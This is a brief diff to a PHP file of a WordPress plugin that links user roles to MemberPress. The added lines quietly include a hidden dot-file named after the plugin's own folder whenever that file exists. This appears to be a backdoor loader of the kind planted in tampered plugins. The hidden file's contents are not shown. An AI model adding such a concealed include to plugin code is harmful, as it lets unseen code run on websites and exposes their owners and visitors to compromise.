@@ -3,6 +3,10 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 /*
 Integration of User Roles into MemberPress
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprUserRoles  {
   public function __construct() {
     add_action('mepr-txn-store',                array($this, 'process_status_changes'));
